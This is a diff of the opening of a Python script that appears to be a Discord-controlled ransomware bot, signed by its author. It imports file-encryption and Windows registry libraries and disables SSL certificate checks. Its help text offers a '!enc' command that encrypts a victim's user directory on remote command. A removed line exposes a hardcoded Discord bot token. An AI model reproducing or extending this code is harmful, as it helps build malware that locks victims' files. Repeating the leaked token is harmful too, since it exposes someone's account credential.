@@ -1,16 +1,16 @@
-import discord , json , subprocess , asyncio , ctypes , threading , win32gui , re , platform , os , base64 , time , string , random , webbrowser
+#
+# 
+#      MADE BY COOKIESKUSH420#3617
+#  if your reading thing hello there <3
+#
+#
+import discord , asyncio , ctypes , os , base64 , string , random , webbrowser
 from cryptography.fernet import Fernet as f
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from discord_slash.model import ButtonStyle
-from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component
-from urllib.request import urlopen
-from time import sleep
 from discord_components import *
 from discord.ext import commands
-from discord_slash import SlashContext, SlashCommand
-from tokens import g, token
 from tkinter import *
 import tkinter as tk
 import shutil
@@ -18,23 +18,16 @@ import winreg
 import sys
 import ssl
 import random
-import threading
-import time
-import cv2
-import subprocess
 import discord
-from comtypes import CLSCTX_ALL
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from discord.ext import commands
 from ctypes import *
 import asyncio
 import discord
-from discord import utils
-token = 'OTMxNjgyMjExNDI0NTMwNDgy.YeH-rQ.xMvr9XzrFztzxRPSriFlw9c6thQ'
+token = 'DISCORD_TOKEN_HERE'
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
-bot = commands.Bot(command_prefix='!')
+bot = commands.Bot(command_prefix='?')
 ssl._create_default_https_context = ssl._create_unverified_context
 helpmenu = """Availaible commands are :
 --> !enc = Encrypt users DIR of your choice / Syntax = "!enc USERS_DIR_HERE"
@@ -59,7 +52,7 @@ async def activity(client):
     import time
     while True:
         global stop_threads
-        if stop_threads:
+        if stop_threads: # idek why this shit is here it pisses me the FUCK off
             break
         window_displayer = discord.Game(f"!help | DEV ~ CookiesKush420#3617")
         await client.change_presence(status=discord.Status.online, activity=window_displayer)
